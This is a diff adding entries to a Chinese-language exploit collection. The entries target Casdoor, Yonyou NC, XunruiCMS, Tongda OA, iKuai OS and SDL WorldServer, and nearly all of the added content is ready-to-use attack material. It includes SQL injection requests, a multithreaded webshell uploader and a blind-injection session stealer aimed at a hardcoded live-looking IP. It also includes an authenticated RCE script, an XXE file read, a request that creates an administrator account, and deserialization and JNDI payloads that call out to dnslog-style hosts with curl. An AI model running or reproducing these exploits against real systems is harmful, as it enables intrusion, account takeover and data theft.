@@ -658,3 +658,309 @@ if __name__ == '__main__':
     main()
 ```
 
+## Casdoor单点登录系统SQL注入CVE-2022-24124
+
+```
+GET /api/get-organizations?p=123&pageSize=123&value=cfx&sortField&sortOrder&field=updatexml(null,version(),null) HTTP/1.1 
+Host: {hostname} 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
+Accept-Encoding: gzip, deflate DNT: 1 
+Connection: close 
+Upgrade-Insecure-Requests: 1
+```
+
+## 用友 NC 6.5版本 FileReceiveServlet 路由任意文件上传漏洞
+
+```
+import requests
+import threadpool
+import urllib3
+import sys
+import argparse
+urllib3.disable_warnings()
+
+proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
+header = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Referer": "https://google.com",
+}
+def multithreading(funcname, filename="url.txt", pools=5):
+    works = []
+    with open(filename, "r") as f:
+        for i in f:
+            func_params = [i.rstrip("\n")]
+            works.append((func_params, None))
+    pool = threadpool.ThreadPool(pools)
+    reqs = threadpool.makeRequests(funcname, works)
+    [pool.putRequest(req) for req in reqs]
+    pool.wait()
+def wirte_targets(vurl, filename):
+    with open(filename, "a+") as f:
+        f.write(vurl + "\n")
+        return vurl
+def exp(u):
+    uploadHeader = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+        "Content-Type": "multipart/form-data;",
+        "Referer": "https://google.com"
+    }
+    uploadData = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"
+    shellFlag = "t0test0ls"
+    uploadData += shellFlag
+    try:
+        req1 = requests.post(u + "/servlet/FileReceiveServlet", headers=uploadHeader, verify=False, data=uploadData,
+                             timeout=25)
+        if req1.status_code == 200:
+            req3 = requests.get(u + "/t00ls.jsp", headers=header, verify=False, timeout=25)
+            if req3.text.index(shellFlag) >= 0:
+                printFlag = "[Getshell]" + u + "/t00ls.jsp" + "\n"
+                print(printFlag)
+                wirte_targets(printFlag, "vuln.txt")
+    except:
+        pass
+    # print(printFlag, end="")
+if __name__ == "__main__":
+    if (len(sys.argv)) < 2:
+        print('useage : python' + str(sys.argv[0]) + ' -h')
+    else:
+        parser = argparse.ArgumentParser()
+        parser.description = 'YONYOU UC 6.5 FILE UPLOAD!'
+        parser.add_argument('-u', help="url -> example [url]http://127.0.0.1[/url]", type=str, dest='check_url')
+        parser.add_argument('-r', help="url list to file", type=str, dest='check_file')
+        args = parser.parse_args()
+        if args.check_url:
+            exp(args.check_url)
+        if (args.check_file):
+            multithreading(exp, args.check_file, 8)
+```
+
+## 迅睿CMS XUNRUICMS 4.5.0版本 api_related_html 远程代码执行漏洞
+
+```
+/index.php?s=api&c=api&m=template&app=admin&name=api_related.html&phpcmf_dir=admin&mid=%20action=function%20name=phpinfo%20param0=-1
+
+/index.php?s=api&c=api&m=template&app=admin&name=api_related.html&phpcmf_dir=admin&mid=%20action=function%20name=system%20param0=calc
+```
+
+https://xz.aliyun.com/t/10002
+
+## 通达2017OA前台SQL注入 获取session
+
+```
+# -*- coding:utf-8 -*-
+import requests
+def hello(url, payload):
+    result = ""
+    payload_bak = payload
+    for len in range(1, 27):
+        str = '0'
+        for i in range(0, 7):
+            payload = payload.format(len, 6 - i, int(str + '0', 2))
+            data = {payload: "1", "_SERVER": ""}
+            r = requests.post(url, data=data, timeout=10, verify=False, allow_redirects=False)
+            # print(r.status_code)
+            if r.status_code == 302:
+                str = str + '0'
+            elif r.status_code == 500:
+                str = str + '1'
+            else:
+                hello(url, payload)
+            payload = payload_bak
+        result += chr(int(str, 2))
+        if int(str, 2) == 127:
+            print("系统当前无正在登录的用户...")
+            return result
+        print("第%d位为: %s" % (len, chr(int(str, 2))))
+    return result
+def main():
+    url = "http://60.190.185.74:88/general/document/index.php/recv/register/insert"
+    payload = """title)values("'"^exp(if((ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/1),{},1))>>{}={}),1,710)))# """
+    print("PHPSESSID=%s" % hello(url, payload))
+if __name__ == "__main__":
+    main()
+```
+
+## 通达OA general/score/flow/scoredate/result.php接口存在SQL注入漏洞
+
+```
+/general/score/flow/scoredate/result.php?FLOW_ID=11%BF%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),md5(654321),1,1)a%20from%20information_schema.tables%20group%20by%20a)b)%23
+```
+
+## iKuai OS (post-auth) 后台 RCE
+
+```
+'''
+Description: ikuai8_3.6.x RCE vulnerability after login.
+Author: eqqie
+Other: Bypass IKSH to execute arbitrary BASH commands.
+''' 
+
+import requests
+import base64
+import hashlib
+import json
+import sys
+
+host = "192.168.10.1"
+username = "admin"
+password = "qwe123!@#"
+command = "cat /etc/passwd"
+
+login_form = {"username": "", "passwd": "",
+              "pass": "", "remember_password": "true"}
+
+
+def main(host, user, passwd, cmd):
+    login_form["username"] = user
+    login_form["passwd"] = hashlib.md5(passwd.encode()).hexdigest()
+    login_form["pass"] = base64.b64encode(
+        b"salt_11"+password.encode()).decode()
+    session = requests.Session()
+    print(f"[*] Login with '{user}:{passwd}'\n")
+    res = session.post(
+        url=f"http://{host}/Action/login",
+        data=json.dumps(login_form),
+        timeout=(3, 3)
+    )
+    if res.json()["Result"] != 10000:
+        raise ValueError("Login fail!")
+    print("[*] Run command:", cmd, "\n")
+    res = session.post(
+        url=f"http://{host}/Action/proxy?http://127.0.0.1:34567/command/file",
+        data=cmd,
+        timeout=(3, 3)
+    )
+    print("[*] Exec result:\n")
+    print(res.text)
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 5:
+        main(host, username, password, command)
+    else:
+        main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
+```
+
+https://github.com/yikesoftware/exp_and_poc_archive/tree/main/CVE/CVE-2022-40469
+
+## 用友NC Cloud soapFormat.ajax接口存在XXE
+
+https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver
+
+```
+POST /uapws/soapFormat.ajax HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Connection: close
+Host: 127.0.0.1
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 259
+
+msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+```
+
+## CVE-2022-34267 SDL WorldServer 身份认证绕过RCE
+
+```
+# 添加管理员用户：
+/ws-legacy/services/UserWSUserManager?method=createUser_&username=testuser&password=testuser@qaz123&firstName=luis&lastName=ladon&userType=Administrator&token=2
+# 或者：
+
+POST /ws-legacy/services/UserWSUserManager HTTP/1.1
+Host: localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5763.212 Safari/537.36 OPR/98.0.4728.119
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=A440950C0CE03EBC83A30F926F0FC3E3
+Connection: close
+SOAPAction: 
+Content-Type: text/xml;charset=UTF-8
+Content-Length: 856
+
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:com="http://www.idiominc.org/com.idiominc.webservices.UserWSUserManager">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <com:createUser_ soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+         <token xsi:type="xsd:string">2</token>
+         <username xsi:type="xsd:string">testuser</username>
+         <password xsi:type="xsd:string">testuser@qaz123</password>
+         <firstName xsi:type="xsd:string">luis</firstName>
+         <lastName xsi:type="xsd:string">ladon</lastName>
+         <userType xsi:type="xsd:string">Administrator</userType>
+      </com:createUser_>
+   </soapenv:Body>
+</soapenv:Envelope>
+
+# 上传jar文件，上传表单：
+</!DOCTYPE html>
+<html>
+<head>
+    <title>file upload</title>
+</head>
+<body>
+<h2>hello</h2>
+    <form  action="http://xxx.xxx.xxx/ws-api/v2/customizations/api?token=02" method="post" enctype="multipart/form-data">
+        <input type="file" name="file"/>
+        <input type="submit" value="Submit" />
+    </form>
+</body>
+</html>
+```
+
+## CVE-2022-34268 SDL WroldServer 反序列化RCE
+
+https://mp.weixin.qq.com/s/mGTX2uHvKCLWQ0WiYDmikQ
+
+```
+# 1.使用ysoserial生成序列化数据
+java -jar ysoserial-all.jar CommonsCollections1 "curl 97c2a13451.ipv6.1433.eu.org" > poc.bin
+# 2.向目标发送序列化数据
+curl --data-binary @poc.bin http://xxx.xxx.xxx/ws-legacy/clientLogin -H "Content-Type: application/x-java-serialized-object"
+```
+
+## CVE-2022-34269 SDL WroldServer SSRF
+
+```
+# 1.创建新的服务
+/ws-legacy/load_dtd?system_id=http%3a//127.0.0.1%3a8080/ws-legacy/services/AdminService%3fmethod%3d!--%253E%253Cdeployment%2520xmlns%253D%2522http%253A%252F%252Fxml.apache.org%252Faxis%252Fwsdd%252F%2522%2520xmlns%253Ajava%253D%2522http%253A%252F%252Fxml.apache.org%252Faxis%252Fwsdd%252Fproviders%252Fjava%2522%253E%253Cservice%2520name%253D%2522ServiceFactoryService%2522%2520provider%253D%2522java%253ARPC%2522%253E%253Cparameter%2520name%253D%2522className%2522%2520value%253D%2522org.apache.axis.client.ServiceFactory%2522%252F%253E%253Cparameter%2520name%253D%2522allowedMethods%2522%2520value%253D%2522*%2522%252F%253E%253C%252Fservice%253E%253C%252Fdeployment&token=02
+
+# 2.启动LDAP服务
+java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C 'curl 8e2wrm.dnslog.cn'
+
+# 3.在Burp中发送请求
+POST /ws-legacy/services/UserWSUserManager HTTP/1.1
+Host: localhost:8080
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5763.212 Safari/537.36 OPR/98.0.4728.119
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=A440950C0CE03EBC83A30F926F0FC3E3
+Connection: close
+SOAPAction:
+Content-Type: text/xml;charset=UTF-8
+Content-Length: 856
+
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:com="http://www.idiominc.org/com.idiominc.webservices.UserWSUserManager">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <cli:getService soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+         <environment xsi:type="x-:Map" xs:type="type:Map" xmlns:x-="http://xml.apache.org/xml-soap" xmlns:xs="http://www.w3.org/2001/XMLSchema-instance">
+             <item xsi:type="x-:mapItem" xs:type="type:mapItem">
+                 <key xsi:type="xsd:string">jndiName</key>
+                 <value xsi:type="xsd:string">ldap://10.0.0.131:1389/ipgtz4</value>
+             </item>
+          </environment>
+       </cli>                  
+   </soapenv:Body>
+</soapenv:Envelope>
+```
+
